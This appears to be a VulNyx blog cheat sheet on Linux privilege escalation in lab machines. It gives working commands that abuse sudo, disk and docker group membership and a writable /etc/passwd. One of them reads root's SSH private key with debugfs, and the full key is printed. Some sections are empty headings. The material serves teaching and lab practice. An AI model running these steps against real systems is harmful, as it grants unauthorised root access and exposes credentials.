---
title: 🐧 Privilege Escalation (Linux)
date: 0003-01-01
layout: post
---

### Groups

#### sudo

When a user is part of the `sudo` **group**, he can run any command as the `root` user.

**Check Group**

```ruby
low@vulnyx:~$ id
uid=1000(low) gid=1000(low) groups=1000(low),27(sudo)
```

**Abuse Group**

```ruby
low@vulnyx:~$ sudo su
root@vulnyx:~# id
uid=0(root) gid=0(root) groups=0(root)
```

#### disk

When a user is part of the `adm` **group**, he can **read log files** on the system.


When a user is part of a `disk` **group**, he or she is granted direct access to the system **disks** and **partitions**.

**Check Group**

```ruby
low@vulnyx:~$ id
uid=1000(low) gid=1000(low) groups=1000(low),6(disk)
```

**Abuse Group**

```ruby
low@vulnyx:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            480M     0  480M   0% /dev
tmpfs            99M  3.2M   96M   4% /run
/dev/sda1        11G  2.2G  8.1G  21% /
tmpfs           494M     0  494M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           494M     0  494M   0% /sys/fs/cgroup
tmpfs            99M     0   99M   0% /run/user/1000
```
```ruby
low@vulnyx:~$ /usr/sbin/debugfs /dev/sda1
debugfs 1.44.5 (15-Dec-2018)
debugfs:  ls /root
debugfs:  ls /root/.ssh/
debugfs:  cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAstkGmc1W+epM0w13VQrLO/wMNWwxFltotpa9elYJVXSlBc+PgF6I
vnpxKBu/BFHAogrQt/i7MI3+64POT6X8nVWokKi9raRlaSFl2k8373C+lLyzt/JewfThUl
VQINQ33vGIemNAbvJkqmMveAthMFEnAnNCnB6jct/Mhr74LjWgmX47tjrTxh3rdUF3SyVV
J6HJMX015n+1md/zGX6CcjqaZGdCi5WY6xJHFkpp9yyszID8fmouUnQOq66C52Dbv5QNxV
H8wSpH0HfTP3lqqMiXga8kUQGrHkfzmDT66wpTT6xvEHEa6zApu1PrDiW5K3EGhpTR/ylm
GhcjB2iDrwAAA8CEFaHVhBWh1QAAAAdzc2gtcnNhAAABAQCy2QaZzVb56kzTDXdVCss7/A
w1bDEWW2i2lr16VglVdKUFz4+AXoi+enEoG78EUcCiCtC3+Lswjf7rg85PpfydVaiQqL2t
pGVpIWXaTzfvcL6UvLO38l7B9OFSVVAg1Dfe8Yh6Y0Bu8mSqYy94C2EwUScCc0KcHqNy38
yGvvguNaCZfju2OtPGHet1QXdLJVUnockxfTXmf7WZ3/MZfoJyOppkZ0KLlZjrEkcWSmn3
LKzMgPx+ai5SdA6rroLnYNu/lA3FUfzBKkfQd9M/eWqoyJeBryRRAaseR/OYNPrrClNPrG
8QcRrrMCm7U+sOJbkrcQaGlNH/KWYaFyMHaIOvAAAAAwEAAQAAAQBFdRunJ6Qbsu7bGGO7
11FOnnhvVvFJaX6lSq2TkU5WrdJZC18Dz7LzpsHDfeMVXlqdk+2zRRoNpVfXR30cWa5dvC
KW67GeejYYOixAOHvUtciOIyr4yVwbn2rSeud/mGuKXetO/LTNYb3Onm6VBHZeOWYZAYJg
91UrC9d2jTv9VZer6rtGJJKVdO8XrVgrciQU2GQgk0bBhcxXV4XOC7wYsoIdEuvkQG53Wu
PZmbU0uoIE6MSVtm3dct7uEt190KAkUNxKOflDmWUgjcyKODeQj/pwUgRaXzNTRaa+tuBU
9I0YwCS+LKt+KvyxO5DrbBDs5egoR3Pdz+Btcivn2i2hAAAAgCYIx3jhzhe5gwS5MnB6yW
LlszD7QWvNm+hhoO8NqIhCEOPRMwMN7fNJ3ACfkh4Tin1YObuUba8Ekn3cJSCt7fZ9Rh4k
tNsRoTZL6Az78gyAq2+OpZYQfLhxSDeypBRcih2ysvuXXZRVk1CEFe1XqNSn4wE82knfk/
qAGo5gPpwiAAAAgQDnpzswlg0aC/RfTdrGh9HuHc8fJQUgBbt3ofKz+ulOKSnnmlfDasK9
ATzM2Ee7HOmV0xXaAaXDsRXkgjoSQow9QWhDiLpR5eRbjjXEY3xcTpqQA1yNNqLkJmA1yP
QnRSJDbLQspSdlC6YDzHa0FcwkK14b0IN2AM7+APXsAQ2MywAAAIEAxaUIB8cQoUkdEeGD
QdVyjBpQQrjARPt5tmnTm1tmJpobkrpmTw7/VDYFUnJ/k7YYiUfsqyw7RJJQPYtnNTanBB
IYohf/jZd0WBAEsTzmtYLHcjo+ln7gMDtyKVj+SqhkXDHaeOkzpW4Ev5RB+clZLRwrAWuu
gaN4ZcqmaVXfzC0AAAALcm9vdEBzYXRvcmk=
-----END OPENSSH PRIVATE KEY-----
```

#### adm

#### docker

When a user is part of the `docker` **group**, they have the ability to **manage containers**.

**Check Group**

```
low@vulnyx:~$ id
uid=1000(low) gid=1000(low) groups=1000(low),109(docker)
```

** Abuse Group**

```ruby
low@vulnyx:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# chmod 4755 /bin/bash
# exit
low@vulnyx:~$ /bin/bash -pi
```

#### lxd

#### fail2ban

#### video

---

### /etc/passwd (Writable)

If a low-privileged user has permissions to write to the `/etc/passwd` file, an attacker can remove the `:x:` (on the `root` user line) and add a **hash**.  
This will change the file where a user's authentication is performed, from being done through the `/etc/shadow` file to being done through the `/etc/passwd` file.

**Check Permissions**

```ruby
low@vulnyx:~$ ls -l /etc/passwd
-rw----rw- 1 root root 1395 abr 21 20:16 /etc/passwd
```

**Create Hash**

```ruby
root@kali:~# openssl passwd -1 "P@ssword123"
$1$TSMXnd0L$DwQWYa.zuPqtZUjyRLWxy0
```

**Add Hash**

```ruby
# before
low@vulnyx:~$ cat /etc/passwd |grep root
root:x:0:0:root:/root:/bin/bash

# after
low@vulnyx:~$ cat /etc/passwd |grep root
root:$1$TSMXnd0L$DwQWYa.zuPqtZUjyRLWxy0:0:0:root:/root:/bin/bash
```

**Authenticate**

```ruby
low@vulnyx:~$ su -
Password:

root@vulnyx:~# id
uid=0(root) gid=0(root) grupos=0(root)
```

---

#### Disclaimer

> ##### WARNING
> All techniques presented in this blog are for educational and ethical purposes.  
> The [VulNyx](https://vulnyx.com) team is not responsible for any misuse or damage caused to third party systems or infrastructure.
{: .block-warning }

<br><br>
<div style="display: flex; justify-content: center; align-items: center; width: 100%; margin-top: 20px;">
  <img src="/assets/gitbook/images/favicon.png" style="width: 30px; height: auto; margin-right: 6px;">
  <span>© VulNyx 2023-2025</span>
</div>
